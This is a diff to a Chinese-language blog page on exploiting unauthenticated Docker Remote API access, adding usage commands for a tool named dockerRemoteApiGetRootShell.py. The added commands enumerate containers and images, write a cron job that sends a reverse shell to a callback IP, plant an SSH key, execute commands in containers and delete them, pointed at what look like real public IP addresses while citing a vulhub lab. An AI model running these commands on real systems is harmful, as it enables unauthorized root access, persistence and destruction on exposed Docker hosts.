@@ -133,7 +133,7 @@
     "keywords": ["docker"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "102"
+    "wordCount": "216"
   }]
   </script>
 
@@ -562,7 +562,7 @@
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="2025-08-25T00:00:00&#43;00:00">25 August 2025</time><span class="px-2 text-primary-500">&middot;</span><span>102 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">1 min</span>
+      <time datetime="2025-08-25T00:00:00&#43;00:00">25 August 2025</time><span class="px-2 text-primary-500">&middot;</span><span>216 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span>
     
 
     
@@ -908,7 +908,30 @@ apt-get install gcc 如果编译完上传上去可能有版本差异
 反弹需要镜像名字但是这个靶场可能环境有问题
 </code></pre><p>复现环境：http://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce</p>
 <p>利用项目：https://github.com/xiju2003/dockerRemoteApiGetRootShell-fix</p>
-
+<p>##安装类库</p>
+<pre tabindex="0"><code>pip install -r requirements.txt
+</code></pre><p>##查看运行的容器</p>
+<pre tabindex="0"><code>python dockerRemoteApiGetRootShell.py -h 139.217.25.172 -p 2375
+</code></pre><p>##查看所有的容器</p>
+<pre tabindex="0"><code>python dockerRemoteApiGetRootShell.py -h 139.217.25.172 -p 2375 -a
+</code></pre><p>##查看所有镜像</p>
+<pre tabindex="0"><code>python dockerRemoteApiGetRootShell.py -h 139.217.25.172 -p 2375 -l
+</code></pre><p>##查看端口映射</p>
+<pre tabindex="0"><code>python dockerRemoteApiGetRootShell.py -h 139.217.25.172 -p 2375 -L
+</code></pre><p>##写计划任务（centos,redhat等,加-u参数用于ubuntu等）</p>
+<pre tabindex="0"><code>python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -C -i 镜像名 -H 反弹ip -P 反弹端口
+python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -C -u -i 镜像名 -H 反弹ip -P 反弹端口
+</code></pre><p>##写sshkey(自行修改脚本的中公钥)</p>
+<pre tabindex="0"><code>python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -C -i 镜像名 -k
+</code></pre><p>##在容器中执行命令</p>
+<pre tabindex="0"><code>python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -e &#34;id&#34; -I 容器id
+</code></pre><p>##删除容器</p>
+<pre tabindex="0"><code>python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -c -I 容器id
+</code></pre><p>##修改client api版本</p>
+<pre tabindex="0"><code>python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -v 1.22
+</code></pre><p>##查看服务端api版本</p>
+<pre tabindex="0"><code>python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -V
+</code></pre>
           
           
           
